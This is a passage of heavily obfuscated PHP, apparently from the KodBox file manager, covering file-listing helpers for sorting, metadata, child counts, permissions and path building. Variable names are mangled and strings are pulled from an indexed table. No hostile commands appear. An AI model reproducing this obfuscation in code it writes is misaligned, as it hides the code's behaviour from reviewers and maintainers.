$ö¤–ïää[$Ì¸°˜°[513] . $×¶ŠÑÚÄ] = $Ä¦œˆ¹Í; } $this->alias($Ì¸°˜°[521])->field($‘Üì÷ûù)->limit($ª¤Ã³Âº)->order($Å‘÷¼–²); $ğÕš©€ü = $this->join($Òƒ”±¯)->where($ö¤–ïää)->select(); if ($ğÕš©€ü) { $£³²òí[$Ì¸°˜°[447]] = $ğÕš©€ü; } } protected function _makeOrder($ˆŒ‘‡¤× = false) { $ıÓÅ€ƒ =& $_SERVER[ùèÅ´Ãš]; $Î¤ á¼º = Model($ıÓÅ€ƒ[522])->get($ıÓÅ€ƒ[523]); $ÑÏ¥½«¸ = Model($ıÓÅ€ƒ[522])->get($ıÓÅ€ƒ[524]); $á´ïŒ£ = array($ıÓÅ€ƒ[525] => $ıÓÅ€ƒ[526], $ıÓÅ€ƒ[527] => $ıÓÅ€ƒ[528]); $§„½÷¨ = array($ıÓÅ€ƒ[32] => $ıÓÅ€ƒ[32], $ıÓÅ€ƒ[79] => $ıÓÅ€ƒ[79], $ıÓÅ€ƒ[169] => $ıÓÅ€ƒ[488], $ıÓÅ€ƒ[529] => $ıÓÅ€ƒ[529], $ıÓÅ€ƒ[530] => $ıÓÅ€ƒ[531], $ıÓÅ€ƒ[234] => $ıÓÅ€ƒ[234], $ıÓÅ€ƒ[88] => $ıÓÅ€ƒ[88]); $½³ÖòÇ¢ = Input::get($ıÓÅ€ƒ[532], $ıÓÅ€ƒ[7], $Î¤ á¼º, array_keys($§„½÷¨)); $‰å‹ ©¨ = Input::get($ıÓÅ€ƒ[533], $ıÓÅ€ƒ[7], $ÑÏ¥½«¸, array_keys($á´ïŒ£)); if (!in_array($½³ÖòÇ¢, array_keys($§„½÷¨))) { $½³ÖòÇ¢ = $ıÓÅ€ƒ[32]; } if (!in_array($‰å‹ ©¨, array_keys($á´ïŒ£))) { $½³ÖòÇ¢ = $ıÓÅ€ƒ[525]; } if ($½³ÖòÇ¢ == $ıÓÅ€ƒ[32]) { } $²Ú«İ¶Â = $ıÓÅ€ƒ[534] . $§„½÷¨[$½³ÖòÇ¢] . $ıÓÅ€ƒ[53] . $á´ïŒ£[$‰å‹ ©¨]; $²Ú«İ¶Â = rtrim(trim($²Ú«İ¶Â), $ıÓÅ€ƒ[50]); if ($ˆŒ‘‡¤×) { return array($²Ú«İ¶Â, $á´ïŒ£[$‰å‹ ©¨]); } return $this->order($²Ú«İ¶Â); } protected function _listDataApplyItem($İóªŒ§É, $÷²ş‡Œ† = false) { $Ö»ÆúŠ  = array($İóªŒ§É); $this->_listDataApply($Ö»ÆúŠ , $÷²ş‡Œ†); return $Ö»ÆúŠ [0]; } protected function _listDataApply(&$‰¨´áÎ„, $µÄ¤ÛÙ¹ = false) { $ÔçôªĞ =& $_SERVER[ùèÅ´Ãš]; if (!$‰¨´áÎ„) { $‰¨´áÎ„ = array(); return; } $•ûÓ¬è™ = array_to_keyvalue($‰¨´áÎ„, $ÔçôªĞ[12], $ÔçôªĞ[194]); $•ûÓ¬è™ = array_unique($•ûÓ¬è™); $•ûÓ¬è™ = array_to_int($•ûÓ¬è™); $this->_listSourceCache($‰¨´áÎ„); if (!$µÄ¤ÛÙ¹) { $this->_listAppendMeta($‰¨´áÎ„, $•ûÓ¬è™); $this->_listAppendFileMeta($‰¨´áÎ„, $•ûÓ¬è™); $this->_listAppendChildren($‰¨´áÎ„, $•ûÓ¬è™); } $this->_listAppendPath($‰¨´áÎ„); $this->_listAppendAuth($‰¨´áÎ„); $this->_listAppendSourceInfo($‰¨´áÎ„, $•ûÓ¬è™); $this->_listAppendUser($‰¨´áÎ„); $this->_listFilterInfo($‰¨´áÎ„, $µÄ¤ÛÙ¹); $this->_listAppendAuthSecret($‰¨´áÎ„); } protected function _listSourceCache($ğÒÃµÉÛ) { $Öäèåıİ =& $_SERVER[ùèÅ´Ãš]; foreach ($ğÒÃµÉÛ as $õÛÛ‘€¦) { self::$cacheSourceInfo[$Öäèåıİ[535] . $õÛÛ‘€¦[$Öäèåıİ[194]]] = $õÛÛ‘€¦; } } protected function _listFilterInfo(&$ÙÈò¯š , $¶û¨ÄÏ = false) { $ÁîÑ³è¸ =& $_SERVER[ùèÅ´Ãš]; foreach ($ÙÈò¯š  as &$²ìì»¦İ) { $²ìì»¦İ = $this->pathInfoFilter($²ìì»¦İ); self::$cachePathInfo[$ÁîÑ³è¸[536] . intval($¶û¨ÄÏ) . $ÁîÑ³è¸[464] . $²ìì»¦İ[$ÁîÑ³è¸[194]]] = $²ìì»¦İ; } unset($²ìì»¦İ); } protected function _listMake(&$ù”®°ô) { $‰ù³ìùƒ =& $_SERVER[ùèÅ´Ãš]; $ù”®°ô[$‰ù³ìùƒ[85]] = array(); $ù”®°ô[$‰ù³ìùƒ[86]] = array(); foreach ($ù”®°ô[$‰ù³ìùƒ[447]] as $äí°Éïª) { $ğ£ìˆŞµ = $äí°Éïª[$‰ù³ìùƒ[487]] == 1 ? $‰ù³ìùƒ[85] : $‰ù³ìùƒ[86]; $ù”®°ô[$ğ£ìˆŞµ][] = $äí°Éïª; } unset($ù”®°ô[$‰ù³ìùƒ[447]]); } protected function _listAppendMeta(&$‰¸ïë¶À, $áë£à„İ) { $Ú…ú÷ =& $_SERVER[ùèÅ´Ãš]; $÷é’Îò´ = array($Ú…ú÷[493] => array($Ú…ú÷[494], $áë£à„İ)); $ÓÉ‹„Ï = Model($Ú…ú÷[537])->field($Ú…ú÷[538])->where($÷é’Îò´)->select(); if (!$ÓÉ‹„Ï) { return; } $ÓÈÄşâ´ = array($Ú…ú÷[539], $Ú…ú÷[540], $Ú…ú÷[519]); $‡ìÖò¹ = array(); foreach ($ÓÉ‹„Ï as $¨¡Õ‹¹—) { if (!isset($‡ìÖò¹[$¨¡Õ‹¹—[$Ú…ú÷[194]]])) { $‡ìÖò¹[$¨¡Õ‹¹—[$Ú…ú÷[194]]] = array(); } if (in_array($¨¡Õ‹¹—[$Ú…ú÷[97]], $ÓÈÄşâ´)) { continue; } if ($¨¡Õ‹¹—[$Ú…ú÷[97]] == $Ú…ú÷[541]) { $¨¡Õ‹¹—[$Ú…ú÷[452]] = $Ú…ú÷[542]; } $‡ìÖò¹[$¨¡Õ‹¹—[$Ú…ú÷[194]]][$¨¡Õ‹¹—[$Ú…ú÷[97]]] = $¨¡Õ‹¹—[$Ú…ú÷[452]]; } foreach ($‰¸ïë¶À as &$˜éÒ×ÏŠ) { $˜éÒ×ÏŠ[$Ú…ú÷[543]] = !1; if (isset($‡ìÖò¹[$˜éÒ×ÏŠ[$Ú…ú÷[194]]])) { $˜éÒ×ÏŠ[$Ú…ú÷[543]] = $‡ìÖò¹[$˜éÒ×ÏŠ[$Ú…ú÷[194]]]; } if ($this->fileIsLock($˜éÒ×ÏŠ) && $˜éÒ×ÏŠ[$Ú…ú÷[489]]) { $„üÖî·ğ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $˜éÒ×ÏŠ[$Ú…ú÷[489]][$Ú…ú÷[490]] = AuthModel::authDisable($˜éÒ×ÏŠ[$Ú…ú÷[489]][$Ú…ú÷[490]], $„üÖî·ğ); $˜éÒ×ÏŠ[$Ú…ú÷[489]][$Ú…ú÷[544]][$Ú…ú÷[489]] = $˜éÒ×ÏŠ[$Ú…ú÷[489]][$Ú…ú÷[490]]; } } unset($˜éÒ×ÏŠ); } protected function _listAppendFileMeta(&$í›Ú™Ôˆ, $‚³Ññû) { $ğÂÆÕÆ÷ =& $_SERVER[ùèÅ´Ãš]; $ñè–ÈªŞ = array_to_keyvalue($í›Ú™Ôˆ, $ğÂÆÕÆ÷[12], $ğÂÆÕÆ÷[545]); $ñè–ÈªŞ = array_filter(array_unique($ñè–ÈªŞ)); $ñè–ÈªŞ = array_to_int($ñè–ÈªŞ); if (!$ñè–ÈªŞ) { return; } $“Ëèİß¦ = array($ğÂÆÕÆ÷[546] => array($ğÂÆÕÆ÷[494], $ñè–ÈªŞ)); $¸ºÃÉ¨ˆ = $ğÂÆÕÆ÷[547]; $ÍíÕäÁ = Model($ğÂÆÕÆ÷[548])->field($¸ºÃÉ¨ˆ)->where($“Ëèİß¦)->select(); $ÍíÕäÁ = array_to_keyvalue($ÍíÕäÁ, $ğÂÆÕÆ÷[545]); $Ú¯ÇË­Š = Model($ğÂÆÕÆ÷[549])->field($ğÂÆÕÆ÷[550])->where($“Ëèİß¦)->select(); $Ú¯ÇË­Š = $Ú¯ÇË­Š ? $Ú¯ÇË­Š : array(); $İí…¯ = array(); foreach ($Ú¯ÇË­Š as $°ÆÉ°ëÑ) { if (!isset($İí…¯[$°ÆÉ°ëÑ[$ğÂÆÕÆ÷[545]]])) { $İí…¯[$°ÆÉ°ëÑ[$ğÂÆÕÆ÷[545]]] = array(); } $İí…¯[$°ÆÉ°ëÑ[$ğÂÆÕÆ÷[545]]][$°ÆÉ°ëÑ[$ğÂÆÕÆ÷[97]]] = $°ÆÉ°ëÑ[$ğÂÆÕÆ÷[452]]; } foreach ($í›Ú™Ôˆ as &$ë–×™ÉŸ) { $×”¾¿åÌ = $ë–×™ÉŸ[$ğÂÆÕÆ÷[545]]; if (!$×”¾¿åÌ || !is_array($ÍíÕäÁ[$×”¾¿åÌ])) { continue; } $ÇÑ•¬Âá = $ÍíÕäÁ[$×”¾¿åÌ]; $ÇÑ•¬Âá[$ğÂÆÕÆ÷[79]] = $ë–×™ÉŸ[$ğÂÆÕÆ÷[79]]; $ÇÑ•¬Âá[$ğÂÆÕÆ÷[32]] = $ë–×™ÉŸ[$ğÂÆÕÆ÷[32]]; if (!$ÇÑ•¬Âá[$ğÂÆÕÆ÷[551]]) { Model($ğÂÆÕÆ÷[548])->fileMd5Check($ÇÑ•¬Âá); } if (!isset(self::$cacheFileInfo[$ğÂÆÕÆ÷[552] . $×”¾¿åÌ])) { self::$cacheFileInfo[$ğÂÆÕÆ÷[552] . $×”¾¿åÌ] = array_merge(array(), $ÇÑ•¬Âá); } unset($ÍíÕäÁ[$×”¾¿åÌ][$ğÂÆÕÆ÷[87]]); $çÒÈ·ó¡ = isset($İí…¯[$×”¾¿åÌ]) && is_array($İí…¯[$×”¾¿åÌ]) ? $İí…¯[$×”¾¿åÌ] : array(); $ë–×™ÉŸ[$ğÂÆÕÆ÷[170]] = array_merge($çÒÈ·ó¡, $ÍíÕäÁ[$×”¾¿åÌ]); if (isset($ë–×™ÉŸ[$ğÂÆÕÆ÷[170]][$ğÂÆÕÆ÷[185]])) { $ë–×™ÉŸ[$ğÂÆÕÆ÷[185]] = json_decode($ë–×™ÉŸ[$ğÂÆÕÆ÷[170]][$ğÂÆÕÆ÷[185]], !0); unset($ë–×™ÉŸ[$ğÂÆÕÆ÷[170]][$ğÂÆÕÆ÷[185]]); } } unset($ë–×™ÉŸ); } protected function _listAppendSourceInfo(&$Ó¨€¿áâ, $èó¬šˆÉ) { $‚ÚÇ²Á =& $_SERVER[ùèÅ´Ãš]; $¶âØ÷–§ = Model($‚ÚÇ²Á[553])->listData(); $ò¿¶Ğ£ë = Model($‚ÚÇ²Á[501])->listData(); $ï¥ğä = Model($‚ÚÇ²Á[491])->listData(); $ô‡İ¼‚Î = Model($‚ÚÇ²Á[554])->listSimple(); $Õ³·©¥Å = array_to_keyvalue($¶âØ÷–§, $‚ÚÇ²Á[477]); $Û£ÇŒ¯ã = array_to_keyvalue_group($ò¿¶Ğ£ë, $‚ÚÇ²Á[87], $‚ÚÇ²Á[502]); $€ÇøëÊº = array_to_keyvalue($ï¥ğä, $‚ÚÇ²Á[87]); $®şŸ óû = array_to_keyvalue_group($ô‡İ¼‚Î, $‚ÚÇ²Á[194]); foreach ($Ó¨€¿áâ as &$£¯‡·¬™) { $£¯‡·¬™[$‚ÚÇ²Á[90]] = array($‚ÚÇ²Á[555] => 0, $‚ÚÇ²Á[556] => 0, $‚ÚÇ²Á[557] => 0); if (isset($€ÇøëÊº[$£¯‡·¬™[$‚ÚÇ²Á[194]]])) { $£¯‡·¬™[$‚ÚÇ²Á[90]][$‚ÚÇ²Á[558]] = 1; $£¯‡·¬™[$‚ÚÇ²Á[90]][$‚ÚÇ²Á[559]] = $€ÇøëÊº[$£¯‡·¬™[$‚ÚÇ²Á[194]]][$‚ÚÇ²Á[32]]; } if ($Û£ÇŒ¯ã && $Õ³·©¥Å && isset($Û£ÇŒ¯ã[$£¯‡·¬™[$‚ÚÇ²Á[194]]])) { $£¯‡·¬™[$‚ÚÇ²Á[90]][$‚ÚÇ²Á[560]] = array(); foreach ($Û£ÇŒ¯ã[$£¯‡·¬™[$‚ÚÇ²Á[194]]] as $‰í®ü ‘) { $›Ş™ĞÔ½ = $Õ³·©¥Å[$‰í®ü ‘]; $£¯‡·¬™[$‚ÚÇ²Á[90]][$‚ÚÇ²Á[560]][] = array($‚ÚÇ²Á[561] => $›Ş™ĞÔ½[$‚ÚÇ²Á[477]], $‚ÚÇ²Á[496] => $›Ş™ĞÔ½[$‚ÚÇ²Á[32]], $‚ÚÇ²Á[562] => $›Ş™ĞÔ½[$‚ÚÇ²Á[563]]); } } if ($®şŸ óû && isset($®şŸ óû[$£¯‡·¬™[$‚ÚÇ²Á[194]]])) { $£¯‡·¬™[$‚ÚÇ²Á[90]][$‚ÚÇ²Á[564]] = array(); foreach ($®şŸ óû[$£¯‡·¬™[$‚ÚÇ²Á[194]]] as $»ÉÇñ®›) { $ú®²‹ = $‚ÚÇ²Á[565]; if ($»ÉÇñ®›[$‚ÚÇ²Á[566]] == $‚ÚÇ²Á[91]) { $ú®²‹ .= $‚ÚÇ²Á[567]; } $£¯‡·¬™[$‚ÚÇ²Á[90]][$‚ÚÇ²Á[564]] = array_field_key($»ÉÇñ®›, explode($‚ÚÇ²Á[50], $ú®²‹)); } } } unset($£¯‡·¬™); return $Ó¨€¿áâ; } protected function _listAppendChildren(&$Ë÷„¥ë¾, $¶Õõâ£) { $ú§ê‰Œá =& $_SERVER[ùèÅ´Ãš]; $ÚüÙ…Ë² = array(); $ª ÃÑ¥Ø = array($ú§ê‰Œá[242] => 0, $ú§ê‰Œá[243] => 0); foreach ($Ë÷„¥ë¾ as &$†ößÂŞ“) { if (!$†ößÂŞ“[$ú§ê‰Œá[487]]) { continue; } $ÚüÙ…Ë²[] = intval($†ößÂŞ“[$ú§ê‰Œá[194]]); } unset($†ößÂŞ“); if (!$ÚüÙ…Ë²) { return; } $™‘™ŸÇâ = array($ú§ê‰Œá[193] => array($ú§ê‰Œá[7], $ÚüÙ…Ë²), $ú§ê‰Œá[507] => 0); $•ˆì¬¼ò = array($ú§ê‰Œá[193], $ú§ê‰Œá[487], $ú§ê‰Œá[568] => $ú§ê‰Œá[569]); $¶­¢ÍÎğ = $this->field($•ˆì¬¼ò)->where($™‘™ŸÇâ)->group($ú§ê‰Œá[570])->select(); $š‚ÈáÃÛ = array(); foreach ($¶­¢ÍÎğ as $ÜéÒÄú‘) { $Æ¦±ß“Î = $ÜéÒÄú‘[$ú§ê‰Œá[193]]; $±½º˜Í³ = $ÜéÒÄú‘[$ú§ê‰Œá[487]] == $ú§ê‰Œá[91] ? $ú§ê‰Œá[243] : $ú§ê‰Œá[242]; if (!isset($š‚ÈáÃÛ[$Æ¦±ß“Î])) { $š‚ÈáÃÛ[$Æ¦±ß“Î] = array($ú§ê‰Œá[242] => 0, $ú§ê‰Œá[243] => 0); } $š‚ÈáÃÛ[$Æ¦±ß“Î][$±½º˜Í³] += $ÜéÒÄú‘[$ú§ê‰Œá[569]]; } foreach ($Ë÷„¥ë¾ as &$†ößÂŞ“) { if (!$†ößÂŞ“[$ú§ê‰Œá[487]]) { continue; } $œßœÄù = is_array($š‚ÈáÃÛ[$†ößÂŞ“[$ú§ê‰Œá[194]]]) ? $š‚ÈáÃÛ[$†ößÂŞ“[$ú§ê‰Œá[194]]] : $ª ÃÑ¥Ø; $†ößÂŞ“[$ú§ê‰Œá[243]] = $œßœÄù[$ú§ê‰Œá[243]]; $†ößÂŞ“[$ú§ê‰Œá[242]] = $œßœÄù[$ú§ê‰Œá[242]]; unset($†ößÂŞ“[$ú§ê‰Œá[488]]); } unset($†ößÂŞ“); } protected function _listAppendAuth(&$²™“âÎÒ) { $ê¢é’ÕŠ =& $_SERVER[ùèÅ´Ãš]; $‚Üû×ú´ = array(); foreach ($²™“âÎÒ as $Ù°Æ÷û) { if ($Ù°Æ÷û[$ê¢é’ÕŠ[191]] == self::TYPE_GROUP) { $‚Üû×ú´[] = $Ù°Æ÷û[$ê¢é’ÕŠ[194]]; } } if (!$‚Üû×ú´) { return; } $Î¶¹¯ª­ = array_to_keyvalue($²™“âÎÒ, $ê¢é’ÕŠ[194]); $Ûèˆ í‘ = Model($ê¢é’ÕŠ[571])->getSourceList($‚Üû×ú´, $Î¶¹¯ª­); $¤ÅÉÍ¦È = KodUser::isRoot(); foreach ($²™“âÎÒ as $©Îô‰¾› => &$Ù°Æ÷û) { $Ù°Æ÷û[$ê¢é’ÕŠ[489]] = $Ûèˆ í‘[$Ù°Æ÷û[$ê¢é’ÕŠ[194]]]; if (!$Ù°Æ÷û[$ê¢é’ÕŠ[489]] && $Ù°Æ÷û[$ê¢é’ÕŠ[191]] == self::TYPE_GROUP) { $Ù°Æ÷û[$ê¢é’ÕŠ[489]] = Action($ê¢é’ÕŠ[572])->pathGroupAuthMake($Ù°Æ÷û[$ê¢é’ÕŠ[573]]); if (!$Ù°Æ÷û[$ê¢é’ÕŠ[489]] && !$¤ÅÉÍ¦È) { $Ù°Æ÷û[$ê¢é’ÕŠ[236]] = !1; $Ù°Æ÷û[$ê¢é’ÕŠ[235]] = !1; } } if ($Ù°Æ÷û[$ê¢é’ÕŠ[489]]) { $Ù°Æ÷û[$ê¢é’ÕŠ[236]] = AuthModel::authCheckEdit($Ù°Æ÷û[$ê¢é’ÕŠ[489]][$ê¢é’ÕŠ[490]]); $Ù°Æ÷û[$ê¢é’ÕŠ[235]] = AuthModel::authCheckView($Ù°Æ÷û[$ê¢é’ÕŠ[489]][$ê¢é’ÕŠ[490]]); } $this->groupPathDisplay($Ù°Æ÷û); } unset($Ù°Æ÷û); } public function _listAppendAuthSecret(&$Î‹§‡îå) { $ÖçãËçƒ =& $_SERVER[ùèÅ´Ãš]; if (Model($ÖçãËçƒ[510])->get($ÖçãËçƒ[574]) != $ÖçãËçƒ[91]) { return; } static $ºÌ­ãôÏ = false; if (!$ºÌ­ãôÏ) { $ª’»Èá = Model($ÖçãËçƒ[575]); $¤ÆÉÛùê = Model($ÖçãËçƒ[576]); $ºÌ­ãôÏ = $¤ÆÉÛùê->listData(); $ºÌ­ãôÏ = array_to_keyvalue($ºÌ­ãôÏ, $ÖçãËçƒ[194]); $õ†ÆİØ¢ = json_decode(Model($ÖçãËçƒ[510])->get($ÖçãËçƒ[577]), !0); $õ†ÆİØ¢ = array_to_keyvalue($õ†ÆİØ¢, $ÖçãËçƒ[477]); foreach ($ºÌ­ãôÏ as $Ø¨ºÉ²Î => $Õš´ÛÒé) { $çÌ‡¬à¥ = $õ†ÆİØ¢[$Õš´ÛÒé[$ÖçãËçƒ[578]]]; if (!$çÌ‡¬à¥) { $¤ÆÉÛùê->remove($Õš´ÛÒé[$ÖçãËçƒ[477]]); unset($ºÌ­ãôÏ[$Ø¨ºÉ²Î]); continue; } $½¡óûÕ¢ = $ª’»Èá->listData($çÌ‡¬à¥[$ÖçãËçƒ[489]]); if (!$½¡óûÕ¢) { $¤ÆÉÛùê->remove($Õš´ÛÒé[$ÖçãËçƒ[477]]); unset($ºÌ­ãôÏ[$Ø¨ºÉ²Î]); continue; } $Õš´ÛÒé[$ÖçãËçƒ[489]] = $½¡óûÕ¢; $Õš´ÛÒé[$ÖçãËçƒ[579]] = $çÌ‡¬à¥; $Õš´ÛÒé[$ÖçãËçƒ[580]] = Model($ÖçãËçƒ[581])->getInfoSimpleOuter($Õš´ÛÒé[$ÖçãËçƒ[529]]); $ºÌ­ãôÏ[$Ø¨ºÉ²Î] = $Õš´ÛÒé; } } $©Ø—Şãú = USER_ID; $ëı¡Ãİ³ = array(); $†ß›¶à = $this->_listAppendPath($ëı¡Ãİ³, !0); foreach ($Î‹§‡îå as $Ø¨ºÉ²Î => &$Õš´ÛÒé) { if (!is_array($Õš´ÛÒé[$ÖçãËçƒ[489]])) { continue; } if ($Õš´ÛÒé[$ÖçãËçƒ[191]] != $ÖçãËçƒ[582]) { continue; } if (isset($ºÌ­ãôÏ[$Õš´ÛÒé[$ÖçãËçƒ[194]]])) { $­ş‹Ì¢æ = $ºÌ­ãôÏ[$Õš´ÛÒé[$ÖçãËçƒ[194]]]; if (!is_array($Õš´ÛÒé[$ÖçãËçƒ[543]])) { $Õš´ÛÒé[$ÖçãËçƒ[543]] = array(); } $Õš´ÛÒé[$ÖçãËçƒ[543]][$ÖçãËçƒ[583]] = $­ş‹Ì¢æ[$ÖçãËçƒ[578]]; $Õš´ÛÒé[$ÖçãËçƒ[489]][$ÖçãËçƒ[584]] = $­ş‹Ì¢æ; $Õš´ÛÒé[$ÖçãËçƒ[489]][$ÖçãËçƒ[585]] = $Õš´ÛÒé[$ÖçãËçƒ[586]]; $Õš´ÛÒé[$ÖçãËçƒ[489]][$ÖçãËçƒ[587]] = $ÖçãËçƒ[91]; if ($­ş‹Ì¢æ[$ÖçãËçƒ[529]] != $©Ø—Şãú) { $Õš´ÛÒé[$ÖçãËçƒ[489]][$ÖçãËçƒ[490]] = $Õš´ÛÒé[$ÖçãËçƒ[489]][$ÖçãËçƒ[490]] & $­ş‹Ì¢æ[$ÖçãËçƒ[489]][$ÖçãËçƒ[489]]; } continue; } $ùë‡¥½ = $this->parentLevelArray($Õš´ÛÒé[$ÖçãËçƒ[588]]); $È³­‹³Ø = array_reverse($ùë‡¥½); foreach ($È³­‹³Ø as $çĞ˜ÎŠó => $šÖ…ò÷ô) { if (!isset($ºÌ­ãôÏ[$šÖ…ò÷ô])) { continue; } $­ş‹Ì¢æ = $ºÌ­ãôÏ[$šÖ…ò÷ô]; $Õš´ÛÒé[$ÖçãËçƒ[489]][$ÖçãËçƒ[584]] = $­ş‹Ì¢æ; if ($­ş‹Ì¢æ[$ÖçãËçƒ[529]] != $©Ø—Şãú) { $Õš´ÛÒé[$ÖçãËçƒ[489]][$ÖçãËçƒ[490]] = $Õš´ÛÒé[$ÖçãËçƒ[489]][$ÖçãËçƒ[490]] & $­ş‹Ì¢æ[$ÖçãËçƒ[489]][$ÖçãËçƒ[489]]; } $æ¡ê©§Ñ = $ÖçãËçƒ[12]; $²“¨ÕÌ = count($ùë‡¥½) - $çĞ˜ÎŠó; for ($—æßØÆ¦ = 0; $—æßØÆ¦ < $²“¨ÕÌ; $—æßØÆ¦++) { if (!isset($†ß›¶à[$ùë‡¥½[$—æßØÆ¦]])) { $æ¡ê©§Ñ = $ÖçãËçƒ[12]; break; } $æ¡ê©§Ñ = $æ¡ê©§Ñ . rtrim($†ß›¶à[$ùë‡¥½[$—æßØÆ¦]], $ÖçãËçƒ[8]) . $ÖçãËçƒ[8]; } $Õš´ÛÒé[$ÖçãËçƒ[489]][$ÖçãËçƒ[585]] = rtrim($æ¡ê©§Ñ, $ÖçãËçƒ[8]) . $ÖçãËçƒ[8]; break; } } unset($Õš´ÛÒé); } public function groupPathDisplay(&$¯ıöÓ©Ä) { $È«»áĞ½ =& $_SERVER[ùèÅ´Ãš]; if ($¯ıöÓ©Ä[$È«»áĞ½[191]] != self::TYPE_GROUP) { return; } $œÌñ„æê = Model($È«»áĞ½[589])->getInfo($¯ıöÓ©Ä[$È«»áĞ½[573]]); $®²§Ê¢Ö = $this->parentLevelArray($œÌñ„æê[$È«»áĞ½[588]]); $”ÒÍşİ‚ = $È«»áĞ½[12]; foreach ($®²§Ê¢Ö as $€åçæ¾) { $†”Ùæ = Model($È«»áĞ½[589])->getInfo($€åçæ¾); $”ÒÍşİ‚ .= $†”Ùæ[$È«»áĞ½[90]][$È«»áĞ½[194]] . $È«»áĞ½[50]; } $¯ıöÓ©Ä[$È«»áĞ½[590]] = $œÌñ„æê[$È«»áĞ½[193]]; $¯ıöÓ©Ä[$È«»áĞ½[591]] = $œÌñ„æê[$È«»áĞ½[588]]; $¯ıöÓ©Ä[$È«»áĞ½[592]] = $œÌñ„æê[$È«»áĞ½[593]]; $¯ıöÓ©Ä[$È«»áĞ½[594]] = $”ÒÍşİ‚ . $œÌñ„æê[$È«»áĞ½[90]][$È«»áĞ½[194]]; } protected function _listAppendPath(&$´—¶Ş·×, $Ô‹òÔçº = false) { $±·İìÃ¨ =& $_SERVER[ùèÅ´Ãš]; static $¶±ŞÊîÇ = array(); $Şá½ëª¾ = array(); $ôÈı‡ã¡ = array(); if ($Ô‹òÔçº) { return $¶±ŞÊîÇ; } foreach ($´—¶Ş·× as &$šÚÙæÉ) { $Ú‚—ÕÉ = $šÚÙæÉ[$±·İìÃ¨[194]]; if ($šÚÙæÉ[$±·İìÃ¨[487]] == $±·İìÃ¨[91] && $šÚÙæÉ[$±·İìÃ¨[193]] != 0) { $¶±ŞÊîÇ[$Ú‚—ÕÉ] = $šÚÙæÉ[$±·İìÃ¨[32]]; } if ($šÚÙæÉ[$±·İìÃ¨[487]] == $±·İìÃ¨[91] && $šÚÙæÉ[$±·İìÃ¨[193]] == 0) { $¶±ŞÊîÇ[$Ú‚—ÕÉ] = $this->_listAppendPathRoot($šÚÙæÉ, array()); } if (isset($ôÈı‡ã¡[$šÚÙæÉ[$±·İìÃ¨[588]]])) { continue; } $ôÈı‡ã¡[$šÚÙæÉ[$±·İìÃ¨[588]]] = !0; $Ê¡ìæ× = $this->parentLevelArray($šÚÙæÉ[$±·İìÃ¨[588]]); foreach ($Ê¡ìæ× as $†ãğÖˆ => $¹ãô×±š) { if (isset($¶±ŞÊîÇ[$¹ãô×±š])) { continue; } if ($†ãğÖˆ == 0) { $¶±ŞÊîÇ[$¹ãô×±š] = $this->_listAppendPathRoot($šÚÙæÉ, $Ê¡ìæ×); } if ($†ãğÖˆ != 0) { $Şá½ëª¾[] = $¹ãô×±š; } } } unset($šÚÙæÉ); $Şá½ëª¾ = array_unique($Şá½ëª¾); if (count($Şá½ëª¾) > 0) { $“°ÌÀ®å = array($±·İìÃ¨[493] => array($±·İìÃ¨[494], $Şá½ëª¾)); if (count($Şá½ëª¾) == 1) { $·«À™Ú÷ = $this->sourceInfo($Şá½ëª¾[0]); $éÙ•éÛ‡ = is_array($·«À™Ú÷) ? array($·«À™Ú÷) : !1; } else { $éÙ•éÛ‡ = $this->field($±·İìÃ¨[595])->where($“°ÌÀ®å)->select(); } if (!$éÙ•éÛ‡) { $éÙ•éÛ‡ = array(); } foreach ($éÙ•éÛ‡ as $ÁŠ‹æ—ì) { $¶±ŞÊîÇ[$ÁŠ‹æ—ì[$±·İìÃ¨[194]]] = $ÁŠ‹æ—ì[$±·İìÃ¨[32]]; } } $£†“¸£• = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Á÷÷ÈøÛ = array(); foreach ($´—¶Ş·× as &$šÚÙæÉ) { $Ä¤éÙˆÈ = $šÚÙæÉ[$±·İìÃ¨[588]]; $¶£ÓÀª¸ = $±·İìÃ¨[12]; if (isset($Á÷÷ÈøÛ[$Ä¤éÙˆÈ])) { $¶£ÓÀª¸ = $Á÷÷ÈøÛ[$Ä¤éÙˆÈ]; } else { $Ê¡ìæ× = $this->parentLevelArray($šÚÙæÉ[$±·İìÃ¨[588]]); foreach ($Ê¡ìæ× as $†ãğÖˆ => $¹ãô×±š) { if (isset($¶±ŞÊîÇ[$¹ãô×±š])) { $¶£ÓÀª¸ .= $¶±ŞÊîÇ[$¹ãô×±š] . $±·İìÃ¨[8]; } } $Á÷÷ÈøÛ[$Ä¤éÙˆÈ] = $¶£ÓÀª¸; } $¶£ÓÀª¸ .= $šÚÙæÉ[$±·İìÃ¨[32]]; if ($šÚÙæÉ[$±·İìÃ¨[487]] == $±·İìÃ¨[91]) { $¶£ÓÀª¸ .= $±·İìÃ¨[8]; } $šÚÙæÉ[$±·İìÃ¨[586]] = str_replace($±·İìÃ¨[257], $±·İìÃ¨[8], $¶£ÓÀª¸); if ($šÚÙæÉ[$±·İìÃ¨[193]] == $±·İìÃ¨[231]) { $šÚÙæÉ[$±·İìÃ¨[32]] = trim($¶±ŞÊîÇ[$šÚÙæÉ[$±·İìÃ¨[194]]], $±·İìÃ¨[8]); $šÚÙæÉ[$±·İìÃ¨[586]] = $šÚÙæÉ[$±·İìÃ¨[32]] . $±·İìÃ¨[8]; } if (intval($šÚÙæÉ[$±·İìÃ¨[191]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($šÚÙæÉ, $Ê¡ìæ×, $£†“¸£•); } } unset($šÚÙæÉ); return $´—¶Ş·×; } private function _listAppendPathRecycle(&$³åÒÕ‹İ, $ÌƒıÚ…ƒ, $·‚÷ŒÃ¾) { $†Ñ’Ñ¤Æ =& $_SERVER[ùèÅ´Ãš]; if (!in_array($·‚÷ŒÃ¾, $ÌƒıÚ…ƒ) && $³åÒÕ‹İ[$†Ñ’Ñ¤Æ[194]] != $·‚÷ŒÃ¾) { return; } $½¼·’Ù“ = explode($†Ñ’Ñ¤Æ[8], trim($³åÒÕ‹İ[$†Ñ’Ñ¤Æ[586]], $†Ñ’Ñ¤Æ[8])); $×¶‹·–À = implode($†Ñ’Ñ¤Æ[8], array_slice($½¼·’Ù“, 2)); $³åÒÕ‹İ[$†Ñ’Ñ¤Æ[586]] = $†Ñ’Ñ¤Æ[8] . LNG($†Ñ’Ñ¤Æ[596]) . $†Ñ’Ñ¤Æ[8] . ltrim($×¶‹·–À, $†Ñ’Ñ¤Æ[8]); $³åÒÕ‹İ[$†Ñ’Ñ¤Æ[588]] = 